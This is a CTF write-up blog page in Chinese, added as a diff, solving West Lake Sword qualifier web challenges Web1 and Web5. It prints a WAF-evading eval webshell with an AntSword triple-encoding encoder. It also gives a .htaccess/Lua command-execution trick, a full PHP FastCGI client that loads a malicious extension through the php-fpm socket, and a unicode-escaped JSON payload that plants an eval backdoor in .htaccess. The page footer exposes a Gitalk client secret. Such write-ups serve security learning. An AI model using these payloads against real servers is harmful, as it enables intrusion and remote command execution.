@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>西湖论剑初赛Web1/5 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="西湖论剑初赛Web1/5 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="西湖论剑初赛Web1/5"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/qKqMPs-ml/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>西湖论剑初赛Web1/5</h1>
+            <span class="meta">
+            	Posted on
+              2020-10-08，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>进入题目是个上传页面<br>
+<img src="https://guokeya.github.io/post-images/1602148521751.png" alt="" loading="lazy"><br>
+使用换行符绕过。成功上传php<br>
+<img src="https://guokeya.github.io/post-images/1602148599097.png" alt="" loading="lazy"><br>
+然后发现。不能直接POST传参。会被宝塔拦截<br>
+之前赵总在WMCTF的那题说过。宝塔不会拦截静态文件(没动态传参)<br>
+然后就一直文件上传。访问。<br>
+可以bypass open_basedir<br>
+<img src="https://guokeya.github.io/post-images/1602149141409.png" alt="" loading="lazy"><br>
+可以看到根目录有/readflag。那么还是嘚想办法执行命令<br>
+这里GS大师傅发现。用URL编码3次。宝塔就不会拦截。可以动态执行命令<br>
+直接传个<code>eval(urldecode(urldecode(urldecode($_POST[1]))));</code>即可<br>
+然后蚁剑写个编码器。同样编码三次</p>
+<pre><code>/**
+ * php::base64编码器
+ * Create at: 2020/10/08 11:13:29
+ */
+
+'use strict';
+
+/*
+* @param  {String} pwd   连接密码
+* @param  {Array}  data  编码器处理前的 payload 数组
+* @return {Array}  data  编码器处理后的 payload 数组
+*/
+
+function forceEncode(s) {
+  return Array.from(s).map(i=&gt;'%'+i.charCodeAt(0).toString(16).padStart(2,'0')).join('')
+}
+
+module.exports = (pwd, data, ext={}) =&gt; {
+  const payload = data['_']
+  data[pwd] = forceEncode(forceEncode(forceEncode(payload)));
+  delete data['_'];
+  console.log(data);
+  return data;
+}
+</code></pre>
+<p>加上UA头就能直接上蚁剑了</p>
+<h1 id="解法1">解法1</h1>
+<p>利用宝塔Apache默认安装的lua模块配合htaccess执行系统命令<br>
+<code>https://xz.aliyun.com/t/6088</code><br>
+这里。写一个.htaccess</p>
+<pre><code>AddHandler lua-script .lua
+</code></pre>
+<p>写一个1.lua (apache官网上复制的HelloWorld。替换了下)</p>
+<pre><code>require &quot;string&quot;
+
+function handle(r)
+    r.content_type = &quot;text/plain&quot;
+    local t = io.popen('/readflag')
+    local a = t:read(&quot;*all&quot;)
+    r:puts(a)
+
+    if r.method == 'GET' then
+        for k, v in pairs( r:parseargs() ) do
+            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )
+        end
+    else
+        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)
+    end
+end
+</code></pre>
+<p>访问拿到Flag<br>
+<img src="https://guokeya.github.io/post-images/1602149485630.png" alt="" loading="lazy"></p>
+<h1 id="解法2">解法2</h1>
+<p>利用tmp下的php-fpm socket加载扩展。执行命令<br>
+上传1.so。这是一个恶意扩展。相当于Redis的那个so。可以调用恶意函数<br>
+<code>https://github.com/AntSwordProject/ant_php_extension</code>相同PHP版本编译下就行<br>
+上传蚁剑的利用脚本。2.php</p>
+<pre><code>&lt;?php 
+class Client
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const RESPONDER            = 1;
+    protected $keepAlive = false;
+    protected $_requests = array();
+    protected $_requestCounter = 0;
+    protected function buildPacket($type, $content, $requestId = 1)
+    {
+        $offset = 0;
+        $totLen = strlen($content);
+        $buf    = '';
+        do {
+            // Packets can be a maximum of 65535 bytes
+            $part = substr($content, $offset, 0xffff - 8);
+            $segLen = strlen($part);
+            $buf .= chr(self::VERSION_1)        /* version */
+                . chr($type)                    /* type */
+                . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+                . chr($requestId &amp; 0xFF)        /* requestIdB0 */
+                . chr(($segLen &gt;&gt; 8) &amp; 0xFF)    /* contentLengthB1 */
+                . chr($segLen &amp; 0xFF)           /* contentLengthB0 */
+                . chr(0)                        /* paddingLength */
+                . chr(0)                        /* reserved */
+                . $part;                        /* content */
+            $offset += $segLen;
+        } while ($offset &lt; $totLen);
+        return $buf;
+    }
+    protected function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    protected function readNvpair($data, $length = null)
+    {
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $array = array();
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    public function buildAllPacket(array $params, $stdin)
+    {
+        // Ensure new requestID is not already being tracked
+        do {
+            $this-&gt;_requestCounter++;
+            if ($this-&gt;_requestCounter &gt;= 65536 /* or (1 &lt;&lt; 16) */) {
+                $this-&gt;_requestCounter = 1;
+            }
+            $id = $this-&gt;_requestCounter;
+        } while (isset($this-&gt;_requests[$id]));
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;keepAlive) . str_repeat(chr(0), 5), $id);
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '', $id);
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '', $id);
+        return $request;
+    }
+}
+$sock = stream_socket_client(&quot;unix:///tmp/php-cgi-74.sock&quot;, $errno, $errstr);
+$client = new Client();
+$payload_file = &quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;;
+$params = array(
+    'REQUEST_METHOD' =&gt; 'GET',
+    'SCRIPT_FILENAME' =&gt; $payload_file,
+    'PHP_ADMIN_VALUE' =&gt; &quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;,
+    //这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名
+);
+$data = $client-&gt;buildAllPacket($params, '');
+fwrite($sock, $data);
+var_dump(fread($sock, 4096));
+?&gt;
+</code></pre>
+<p>上传s.php</p>
+<pre><code>&lt;?php antsystem(&quot;/readflag&quot;); ?&gt;
+</code></pre>
+<p>直接访问即可。<br>
+<img src="https://guokeya.github.io/post-images/1602150403855.png" alt="" loading="lazy"><br>
+exp中最好用绝对路径。不然。。这个沙盒。。目录名有点乱</p>
+<h1 id="web5">Web5</h1>
+<p>题目给出了源码<br>
+<img src="https://guokeya.github.io/post-images/1602150845461.png" alt="" loading="lazy"><br>
+这里首先试了下filename为php。safe faild   然后.htaccess可以写入<br>
+又看到代码中会写入\nxxxxx。有点<code>[XNUCA2019Qualifier]EasyPHP]</code>的意思了。<br>
+写htaccess。然后用<code>#&lt;?php evalxxx?&gt;\</code>去注释掉无用字符。然后自动包含<br>
+而且json_decode。是可以用unicode绕过的黑名单检测的。<br>
+构造payload</p>
+<pre><code>{&quot;content&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u005c\u000a\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0040\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0027\u0063\u006d\u0064\u0027\u005d\u0029\u003b\u0020\u003f\u003e\u005c&quot;}
+</code></pre>
+<p>发现还是faild。然后随便打。。发现无论打什么。。content都会safe faild。<br>
+会不会。是直接检测是否存在content这个键。。<br>
+把这个键也unicode编码下。发现可以了<br>
+<img src="https://guokeya.github.io/post-images/1602151357978.png" alt="" loading="lazy"><br>
+访问index.php就会自动包含.htaccess其中的eval。<br>
+<img src="https://guokeya.github.io/post-images/1602151410721.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/dGx1XF8ak/">
+              <span class="post-title">
+                CTFSHOW命令执行的一些特殊变量&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
